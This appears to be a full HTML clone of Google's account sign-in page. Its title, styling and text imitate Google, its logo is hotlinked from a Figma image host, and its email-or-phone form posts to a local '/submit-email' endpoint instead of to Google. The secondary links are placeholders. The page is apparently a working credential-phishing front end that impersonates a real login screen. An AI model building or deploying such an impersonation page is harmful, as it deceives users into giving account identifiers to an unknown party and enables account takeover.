<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:"Google Sans",Arial,sans-serif}
body{background:#f0f4f9;height:100vh;display:flex;justify-content:center;align-items:center;overflow:hidden}
.container{display:flex;flex-direction:column;align-items:center;margin-top:-6px}
.card{width:1040px;height:404px;background:#fff;border-radius:28px;display:flex;padding:48px 36px}
.left{width:50%}
.logo{width:40px;height:40px;object-fit:contain;display:block;margin-bottom:34px}
.title{font-size:57px;font-weight:400;letter-spacing:-2px;color:#1f1f1f;margin-bottom:18px;line-height:1.05}
.subtitle{font-size:16px;line-height:1.5;color:#1f1f1f;max-width:430px}
.right{width:50%;padding-top:68px;display:flex;flex-direction:column;justify-content:space-between}
.top{display:flex;flex-direction:column}
.inputwrap{position:relative;width:460px}
.input{width:460px;height:56px;border:1px solid #747775;border-radius:4px;padding:22px 14px 8px 14px;font-size:16px;outline:none;background:#fff;color:#202124;transition:.12s}
.input:focus{border:2px solid #1a73e8;padding:21px 13px 7px 13px}
.floating{position:absolute;left:14px;top:18px;font-size:16px;color:#5f6368;background:#fff;padding:0 4px;pointer-events:none;transition:.12s}
.input:focus + .floating,.input:not(:placeholder-shown) + .floating{top:-8px;left:12px;font-size:12px;color:#1a73e8}
.forgot{margin-top:14px;font-size:14px;font-weight:500;color:#0b57d0;text-decoration:none;width:max-content;padding:8px 10px;margin-left:-10px;border-radius:20px;transition:.15s}
.forgot:hover{background:#e8f0fe}
.info{margin-top:44px;font-size:14px;line-height:1.45;color:#444746;max-width:470px}
.info a{color:#0b57d0;text-decoration:none;font-weight:500}
.bottomactions{display:flex;justify-content:flex-end;align-items:center;gap:18px;margin-top:20px}
.create{height:40px;display:flex;align-items:center;justify-content:center;padding:0 14px;border-radius:20px;font-size:14px;font-weight:500;color:#0b57d0;text-decoration:none;transition:.15s}
.create:hover{background:#e8f0fe}
.btn{width:79px;height:48px;border:none;border-radius:24px;background:#0b57d0;color:#fff;font-size:14px;font-weight:500;cursor:pointer;transition:.15s}
.btn:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(0,0,0,.3)}
.footer{width:1040px;display:flex;justify-content:space-between;align-items:center;margin-top:16px}
.lang{font-size:12px;color:#444;display:flex;align-items:center;gap:8px}
.lang .arrow{width:0;height:0;border-left:4px solid transparent;border-right:4px solid transparent;border-top:5px solid #444}
.links{display:flex;gap:32px}
.links a{font-size:12px;text-decoration:none;color:#444}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="left">
<img class="logo" src="https://s3-figma-hubfile-images-production.figma.com/hub/file/carousel/img/cbbdf444bdd9c4a5a39af2e727d1b9a433fbc01c">
<div class="title">Sign in</div>
<div class="subtitle">with your Google Account. This account will be available to other Google apps in the browser.</div>
</div>
<div class="right">
<form action="/submit-email" method="POST">
<div class="top">
<div class="inputwrap">
<input class="input" name="identifier" type="text" placeholder=" " required>
<label class="floating">Email or phone</label>
</div>
<a href="#" class="forgot">Forgot email?</a>
<div class="info">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></div>
</div>
<div class="bottomactions">
<a href="#" class="create">Create account</a>
<button class="btn" type="submit">Next</button>
</div>
</form>
</div>
</div>
<div class="footer">
<div class="lang">English (United Kingdom) <div class="arrow"></div></div>
<div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
</div>
</div>
</body>
</html>
